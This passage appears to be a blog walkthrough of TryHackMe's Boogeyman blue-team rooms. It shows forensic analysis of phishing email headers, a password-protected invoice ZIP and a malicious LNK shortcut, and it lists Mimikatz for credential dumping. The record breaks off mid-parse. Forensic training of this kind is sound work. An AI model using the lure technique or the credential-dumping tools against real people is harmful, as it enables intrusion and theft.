<!doctype html>














<!-- `site.alt_lang` can specify a language different from the UI -->
<html lang="en" >
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
  <meta
    name="viewport"
    content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover"
  ><!-- Setup Open Graph image -->

  

  <!-- Begin Jekyll SEO tag v2.8.0 -->
<meta name="generator" content="Jekyll v4.4.1" />
<meta property="og:title" content="THM: Boogeyman (All)" />
<meta property="og:locale" content="en" />
<meta name="description" content="Walkthrough" />
<meta property="og:description" content="Walkthrough" />
<link rel="canonical" href="http://localhost:4000/posts/ctf-blueteam-all-boogeyman" />
<meta property="og:url" content="http://localhost:4000/posts/ctf-blueteam-all-boogeyman" />
<meta property="og:site_name" content="Diogo Lages" />
<meta property="og:image" content="http://localhost:4000/assets/img/thumbnails/ctf-blueteam-boogeyman.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-01-22T00:00:00+01:00" />
<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:image" content="http://localhost:4000/assets/img/thumbnails/ctf-blueteam-boogeyman.png" />
<meta property="twitter:title" content="THM: Boogeyman (All)" />
<meta name="twitter:site" content="@Diogo-Lages" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-01-22T00:00:00+01:00","datePublished":"2025-01-22T00:00:00+01:00","description":"Walkthrough","headline":"THM: Boogeyman (All)","image":"http://localhost:4000/assets/img/thumbnails/ctf-blueteam-boogeyman.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/ctf-blueteam-all-boogeyman"},"url":"http://localhost:4000/posts/ctf-blueteam-all-boogeyman"}</script>
<!-- End Jekyll SEO tag -->


  <title>THM: Boogeyman (All) | Diogo Lages
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">

  <link rel="manifest" href="/assets/img/favicons/site.webmanifest">

<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="Diogo Lages">
<meta name="application-name" content="Diogo Lages">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Resource Hints -->
  
    
      
        <link rel="preconnect" href="https://fonts.googleapis.com" >
      
        <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
      
    
      
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      
        <link rel="dns-prefetch" href="https://fonts.gstatic.com" >
      
    
      
        <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      
        <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
      
    
  

  <!-- Bootstrap -->
  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
  

  <!-- Theme style -->
  <link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css">

  <!-- Web Font -->
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  <!-- Font Awesome Icons -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.1/css/all.min.css">

  <!-- 3rd-party Dependencies -->

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.32.2/dist/tocbot.min.css">
  

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css">
  

  
    <!-- Image Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css">
  

  <!-- Scripts -->

  <script src="/assets/js/dist/theme.min.js"></script>

  <!-- JS selector for site. -->

<!-- commons -->



<!-- layout specified -->


  

  
    <!-- image lazy-loading & popup & clipboard -->
    
  















  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  

  
    

    

  



  <script defer src="https://cdn.jsdelivr.net/combine/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/glightbox@3.3.0/dist/js/glightbox.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.13/dayjs.min.js,npm/dayjs@1.11.13/locale/en.js,npm/dayjs@1.11.13/plugin/relativeTime.js,npm/dayjs@1.11.13/plugin/localizedFormat.js,npm/tocbot@4.32.2/dist/tocbot.min.js"></script>







<script defer src="/assets/js/dist/post.min.js"></script>



<!-- Pageviews -->

  

  



  

  <!-- A placeholder to allow defining custom metadata -->

</head>


  <body>
    <!-- The Side Bar -->

<aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end">
  <header class="profile-wrapper">
    <a href="/" id="avatar" class="rounded-circle"><img src="/assets/img/whoami.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a>

    <a class="site-title d-block" href="/">Diogo Lages</a>
    <p class="site-subtitle fst-italic mb-0">You can't keep it a secret, because you're a good man</p>
  </header>
  <!-- .profile-wrapper -->

  <nav class="flex-column flex-grow-1 w-100 ps-0">
    <ul class="nav">
      <!-- home -->
      <li class="nav-item">
        <a href="/" class="nav-link">
          <i class="fa-fw fas fa-home"></i>
          <span>HOME</span>
        </a>
      </li>
      <!-- the real tabs -->
      
        <li class="nav-item">
          <a href="/categories/" class="nav-link">
            <i class="fa-fw fas fa-stream"></i>
            

            <span>CATEGORIES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/tags/" class="nav-link">
            <i class="fa-fw fas fa-tags"></i>
            

            <span>TAGS</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/archives/" class="nav-link">
            <i class="fa-fw fas fa-archive"></i>
            

            <span>ARCHIVES</span>
          </a>
        </li>
        <!-- .nav-item -->
      
        <li class="nav-item">
          <a href="/about/" class="nav-link">
            <i class="fa-fw fas fa-info-circle"></i>
            

            <span>ABOUT</span>
          </a>
        </li>
        <!-- .nav-item -->
      
    </ul>
  </nav>

  <div class="sidebar-bottom d-flex flex-wrap  align-items-center w-100">
    
      <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
        <a
          href="https://github.com/Diogo-Lages"
          aria-label="github"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-github"></i>
        </a>
      
    
      

      
        <a
          href="https://www.linkedin.com/in/diogo-lages/"
          aria-label="linkedin"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fab fa-linkedin"></i>
        </a>
      
    
      

      
        <a
          href="https://tryhackme.com/p/DiogoLages"
          aria-label="link"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fas fa-user-secret"></i>
        </a>
      
    
      

      
        <a
          href="https://osintframework.com/"
          aria-label="link"
          

          
            target="_blank"
            
          

          

          
            rel="noopener noreferrer"
          
        >
          <i class="fas fa-fingerprint"></i>
        </a>
      
    
  </div>
  <!-- .sidebar-bottom -->
</aside>
<!-- #sidebar -->


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div class="container d-flex flex-column px-xxl-5">
        <!-- The Top Bar -->

<header id="topbar-wrapper" aria-label="Top Bar">
  <div
    id="topbar"
    class="d-flex align-items-center justify-content-between px-lg-3 h-100"
  >
    <nav id="breadcrumb" aria-label="Breadcrumb">
      

      
        
          
            <span>
              <a href="/">Home</a>
            </span>

          
        
          
        
          
            
              <span>THM: Boogeyman (All)</span>
            

          
        
      
    </nav>
    <!-- endof #breadcrumb -->

    <button type="button" id="sidebar-trigger" class="btn btn-link">
      <i class="fas fa-bars fa-fw"></i>
    </button>

    <div id="topbar-title">
      Post
    </div>

    <button type="button" id="search-trigger" class="btn btn-link">
      <i class="fas fa-search fa-fw"></i>
    </button>

    <search id="search" class="align-items-center ms-3 ms-lg-0">
      <i class="fas fa-search fa-fw"></i>
      <input
        class="form-control"
        id="search-input"
        type="search"
        aria-label="search"
        autocomplete="off"
        placeholder="Search..."
      >
    </search>
    <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button>
  </div>
</header>


        <div class="row flex-grow-1">
          <main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              <!-- Refactor the HTML structure -->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Change the icon of checkbox -->



<!-- Handle images -->




  
  

  
    
      
      
    

    
    

    

    
    

    
    
    

    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    
      

      
      
      

      
    

    <!-- take out classes -->
    

    
    

    

    
      
    

    <!-- lazy-load images -->
    

    
      <!-- make sure the `<img>` is wrapped by `<a>` -->
      

      
        <!-- create the image wrapper -->
        

        
        
      
    

    <!-- combine -->
    
  

  


<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  

  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    
      

      
      

      
      
      

      
    

    
  




<!-- return -->










<article class="px-1" data-toc="true">
  <header>
    <h1 data-toc-skip>THM: Boogeyman (All)</h1>
    

    <div class="post-meta text-muted">
      <!-- published date -->
      <span>
        Posted
        <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1737500400"
  data-df="ll"
  
    data-bs-toggle="tooltip" data-bs-placement="bottom"
  
>
  Jan 22, 2025
</time>

      </span>

      <!-- lastmod date -->
      

      
        
        
        

        

        <div class="mt-3 mb-3">
          <a href="/assets/img/thumbnails/ctf-blueteam-boogeyman.png" class="popup img-link preview-img shimmer"><img src="/assets/img/thumbnails/ctf-blueteam-boogeyman.png"  alt="Preview Image" width="1200" height="630"  loading="lazy"></a></div>
      

      <div class="d-flex justify-content-between">
        <!-- author(s) -->
        <span>
          

          By

          <em>
            
              <a href="https://twitter.com/diogo-lages">Diogo Lages</a>
            
          </em>
        </span>

        <div>
          <!-- pageviews -->
          

          <!-- read time -->
          <!-- Calculate the post's reading time, and display the word count in tooltip -->



<!-- words per minute -->










<!-- return element -->
<span
  class="readtime"
  data-bs-toggle="tooltip"
  data-bs-placement="bottom"
  title="2541 words"
>
  <em>14 min</em> read</span>

        </div>
      </div>
    </div>
  </header>

  
    <div id="toc-bar" class="d-flex align-items-center justify-content-between invisible">
      <span class="label text-truncate">THM: Boogeyman (All)</span>
      <button type="button" class="toc-trigger btn me-1">
        <i class="fa-solid fa-list-ul fa-fw"></i>
      </button>
    </div>

    <button id="toc-solo-trigger" type="button" class="toc-trigger btn btn-outline-secondary btn-sm">
      <span class="label ps-2 pe-1">Contents</span>
      <i class="fa-solid fa-angle-right fa-fw"></i>
    </button>

    <dialog id="toc-popup" class="p-0">
      <div class="header d-flex flex-row align-items-center justify-content-between">
        <div class="label text-truncate py-2 ms-4">THM: Boogeyman (All)</div>
        <button id="toc-popup-close" type="button" class="btn mx-1 my-1 opacity-75">
          <i class="fas fa-close"></i>
        </button>
      </div>
      <div id="toc-popup-content" class="px-4 py-3 pb-4"></div>
    </dialog>
  

  <div class="content">
    <h3 id="walkthrough"><span class="me-2">Walkthrough</span><a href="#walkthrough" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="ctf-platform-tryhackme"><span class="me-2"><strong>CTF Platform</strong>: TryHackMe</span><a href="#ctf-platform-tryhackme" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<h4 id="level-medium"><span class="me-2"><strong>Level</strong>: Medium</span><a href="#level-medium" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<h4 id="tools-used"><span class="me-2"><strong>Tools Used:</strong></span><a href="#tools-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<ul>
  <li><strong>Impacket</strong>: For SMB server setup and file transfer.</li>
  <li><strong>Wireshark/Tshark</strong>: For network traffic analysis.</li>
  <li><strong>jq</strong>: For parsing JSON logs.</li>
  <li><strong>PowerShell</strong>: For decoding and analyzing malicious scripts.</li>
  <li><strong>KeePass/KPCLI</strong>: For decrypting KeePass databases.</li>
  <li><strong>Base64</strong>: For decoding file contents.</li>
  <li><strong>lnkparse</strong>: For analyzing Windows shortcut files.</li>
  <li><strong>SQLite3</strong>: For reading Sticky Notes databases.</li>
  <li><strong>Volatility</strong>: For memory forensics and process analysis.</li>
  <li><strong>Didier Stevens Suite (oledump.py)</strong>: For analyzing malicious Office documents.</li>
  <li><strong>dnSpy</strong>: For decompiling .NET executables.</li>
  <li><strong>Elasticsearch</strong>: For querying logs.</li>
  <li><strong>PowerView.ps1</strong>: For enumerating domain resources.</li>
  <li><strong>Invoke-ShareFinder</strong>: For discovering shared resources and credentials.</li>
  <li><strong>Mimikatz</strong>: For credential dumping and Pass-the-Hash attacks.</li>
</ul>

<h4 id="resources-used"><span class="me-2"><strong>Resources Used:</strong></span><a href="#resources-used" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<ul>
  <li>Boogeyman 1: <a href="https://tryhackme.com/room/boogeyman1">TryHackMe</a></li>
  <li>Boogeyman 2: <a href="https://tryhackme.com/room/boogeyman2">TryHackMe</a></li>
  <li>Boogeyman 3: <a href="https://tryhackme.com/room/boogeyman3">TryHackMe</a></li>
  <li>PowerShell Event Logs</li>
  <li>PCAP File Analysis</li>
  <li>Malicious Attachment Analysis</li>
  <li>Memory Dump Analysis</li>
  <li>Elasticsearch Logs</li>
</ul>

<h2 id="boogeyman-1"><span class="me-2">Boogeyman 1</span><a href="#boogeyman-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<hr />

<h3 id="background"><span class="me-2">Background</span><a href="#background" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Julianne, a finance employee working for Quick Logistics LLC, received a follow-up email regarding an unpaid invoice from their business partner, B Packaging Inc. Unbeknownst to her, the attached document was malicious and compromised her workstation.</p>

<hr />

<h3 id="exfiltration"><span class="me-2">Exfiltration</span><a href="#exfiltration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<h4 id="setting-up-smb-server"><span class="me-2">Setting Up SMB Server</span><a href="#setting-up-smb-server" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>To exfiltrate artifacts:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>impacket-smbserver &lt;NAME&gt; <span class="nb">.</span> <span class="nt">-smb2support</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="zipping-artifacts"><span class="me-2">Zipping Artifacts</span><a href="#zipping-artifacts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>From the Ubuntu machine:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>ubuntu@tryhackme:~<span class="nv">$ </span><span class="nb">cd </span>Desktop
ubuntu@tryhackme:~/Desktop<span class="nv">$ </span>zip <span class="nt">-r</span> artefacts.zip artefacts/<span class="k">*</span>  
  <span class="o">[</span>..omitted..]
ubuntu@tryhackme:~/Desktop<span class="nv">$ </span>smbclient //&lt;IP&gt;/&lt;NAME&gt; <span class="nt">-c</span> <span class="s1">'put artefacts.zip'</span> <span class="nt">-N</span>
</pre></td></tr></tbody></table></code></div></div>

<h4 id="extracting-artifacts"><span class="me-2">Extracting Artifacts</span><a href="#extracting-artifacts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>On the host machine:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>unzip artefacts.zip
<span class="nv">$ </span><span class="nb">ls </span>artefacts
  capture.pcapng  dump.eml  evtx2json  powershell.evtx  powershell.json
</pre></td></tr></tbody></table></code></div></div>

<hr />

<h3 id="powershell-events"><span class="me-2">PowerShell Events</span><a href="#powershell-events" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Analyzing PowerShell event logs:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>powershell.json | jq <span class="nt">-r</span> <span class="s1">'.EventID'</span> | <span class="nb">sort</span> | <span class="nb">uniq</span> <span class="nt">-c</span> | <span class="nb">sort</span> <span class="nt">-bnr</span>
    939 4104
     44 4100
      2 53504
      1 40962
      1 40961
</pre></td></tr></tbody></table></code></div></div>

<hr />

<h3 id="protocol-hierarchy"><span class="me-2">Protocol Hierarchy</span><a href="#protocol-hierarchy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Analyzing protocol usage:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>tshark <span class="nt">-r</span> capture.pcapng | <span class="nb">sed</span> <span class="nt">-e</span> <span class="s1">'s/^[ ]*\w*\s*//g'</span> | <span class="nb">sed</span> <span class="nt">-E</span> <span class="s1">'s/\s{2,}/ /g'</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f5</span> | <span class="nb">sort</span> | <span class="nb">uniq</span> <span class="nt">-c</span> | <span class="nb">sort</span> <span class="nt">-bnr</span>
  38769 TCP
   3422 TLSv1.3
   2060 QUIC
   1989 HTTP
   1229 DNS
   1084 TLSv1.2
     82 SSDP
     77 TLSv1
     74 ARP
     14 UDP
     12 NBNS
     10 MDNS
      7 HTTP/XML
      5 SSLv2
      5 IGMPv3
      5 ICMPv6
      5 ICMP
      5 BROWSER
      2 LLMNR
      2 DHCP
</pre></td></tr></tbody></table></code></div></div>

<hr />

<h3 id="email-analysis"><span class="me-2">Email Analysis</span><a href="#email-analysis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>The security team flagged the suspicious execution of the attachment, indicating a targeted attack on the finance team. The TTP used is attributed to the new threat group named <strong>Boogeyman</strong>, known for targeting the logistics sector.</p>

<h4 id="exchange-information"><span class="me-2">Exchange Information</span><a href="#exchange-information" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The email was sent by Arthur Griffin (<code class="language-plaintext highlighter-rouge">agriffin@bpakcaging.xyz</code>) to Julianne Westcott (<code class="language-plaintext highlighter-rouge">julianne.westcott@hotmail.com</code>):</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>From: Arthur Griffin &lt;agriffin@bpakcaging.xyz&gt;
Date: Fri, 13 Jan 2023 09:25:26 +0000
Subject: Collection for Quick Logistics LLC - Jan 2023
Message-Id: &lt;4uiwqc5wd1qx.HPk2p-JE_jYbkWIRB-SmuA2@tracking.bpakcaging.xyz&gt;
Reply-To: Arthur Griffin &lt;agriffin@bpakcaging.xyz&gt;
Sender: agriffin@bpakcaging.xyz
To: Julianne Westcott &lt;julianne.westcott@hotmail.com&gt;
</pre></td></tr></tbody></table></code></div></div>

<h4 id="security-headers"><span class="me-2">Security Headers</span><a href="#security-headers" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>Both SPF and DMARC passed, showing no email spoofing. DKIM checks detected two signatures:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>Authentication-Results: spf=pass (sender IP is 15.235.99.80)
 smtp.mailfrom=bpakcaging.xyz; dkim=pass (signature was verified)
 header.d=bpakcaging.xyz;dmarc=bestguesspass action=none
 header.from=bpakcaging.xyz;compauth=pass reason=109
Received-SPF: Pass (protection.outlook.com: domain of bpakcaging.xyz
 designates 15.235.99.80 as permitted sender) receiver=protection.outlook.com;
 client-ip=15.235.99.80; helo=pa80.mxout.mta1.net; pr=C
DKIM-Signature: v=1; a=rsa-sha256; d=bpakcaging.xyz; s=api; c=relaxed/simple;
	t=1673601926; h=from:date:subject:reply-to:to:list-unsubscribe:mime-version;
	bh=DORzQK4K9VXO5g47mYpyX7cPagIyvAX1RLfbY0szvCc=;
	b=dCB9MhhsZqg4h2P9dg5zMjLj7HVS9vt0fXuqEzH8cj6ft+YBJxvZHkF8uc+CeOas6CoICaPu13Q
	oL/xVebg3aO8bmlooJWTAZx7mmrh/1ZQBVHm3wvGVI9Xn55nhWzRGoqVOAAPPM6+MEHFwZDIjKDAs
	RpDurrnykQeCXCp127k=
DKIM-Signature: v=1; a=rsa-sha256; d=elasticemail.com; s=api;
	c=relaxed/simple; t=1673601926;
	h=from:date:subject:reply-to:to:list-unsubscribe;
	bh=DORzQK4K9VXO5g47mYpyX7cPagIyvAX1RLfbY0szvCc=;
	b=jcC3z+U5lVQUJEYRyQ76Z+xaJMrXN2YdjyM8pUl7hgXesQaY7rqSORNRWynpDQ3/CBSllw31eDq
	WmoqpFqj2uVy5RXK73lkBEHs5ju1eH/4svHpZLS9+wU/tO5dfZVUImvY32iinpJCtoiMLjdpKYMA/
	d5BBGqluALtqy9fZQzM=
</pre></td></tr></tbody></table></code></div></div>

<h4 id="email-body"><span class="me-2">Email Body</span><a href="#email-body" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>The email contained an encrypted attachment with the password <code class="language-plaintext highlighter-rouge">Invoice2023!</code>.</p>

<h4 id="email-attachment"><span class="me-2">Email Attachment</span><a href="#email-attachment" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>
<p>A ZIP file, <code class="language-plaintext highlighter-rouge">Invoice.zip</code>, was attached to the email. Extracting its contents:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>Invoice.zip_b64 | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'
'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> Invoice.zip
<span class="nv">$ </span>file Invoice.zip          
  Invoice.zip: Zip archive data, at least v2.0 to extract, compression <span class="nv">method</span><span class="o">=</span>deflate
<span class="nv">$ </span>unzip Invoice.zip  
  Archive:  Invoice.zip
  <span class="o">[</span>Invoice.zip] Invoice_20230103.lnk password: Invoice2023!
  zsh: suspended  unzip Invoice.zip
</pre></td></tr></tbody></table></code></div></div>

<p>Examining <code class="language-plaintext highlighter-rouge">Invoice_20230103.lnk</code>:</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>lnkparse Invoice_20230103.lnk 
  Windows Shortcut Information:
     Link CLSID: 00021401-0000-0000-C000-000000000046
     Link Flags: HasTargetIDList | HasName | HasRelativePath | HasWorkingDir | HasArguments | HasIconLocation | IsUnicode | HasExpIcon - <span class="o">(</span>16637<span class="o">)</span>
     File Flags:  - <span class="o">(</span>0<span class="o">)</span>
     Creation Timestamp: None
     Modified Timestamp: None
     Accessed Timestamp: None
     Icon Index: 0 
     Window Style: SW_SHOWMINNOACTIVE 
     HotKey: CONTROL - C <span class="o">{</span>0x4302<span class="o">}</span> 
     TARGETS:
        Index: 78
        ITEMS:
           Root Folder
              Sort index: My Computer
              Guid: 20D04FE0-3AEA-1069-A2D8-08002B30309D
           Volume Item
              Flags: 0xf
              Data: None
           File entry
              Flags: Is directory
              Modification <span class="nb">time</span>: None
              File attribute flags: 16
              Primary name: Windows
           File entry
              Flags: Is directory
              Modification <span class="nb">time</span>: None
              File attribute flags: 16
              Primary name: System32
           File entry
              Flags: Is directory
              Modification <span class="nb">time</span>: None
              File attribute flags: 16
              Primary name: WindowsPowerShell
           File entry
              Flags: Is directory
              Modification <span class="nb">time</span>: None
              File attribute flags: 16
              Primary name: v1.0
           File entry
              Flags: Is file
              Modification <span class="nb">time</span>: None
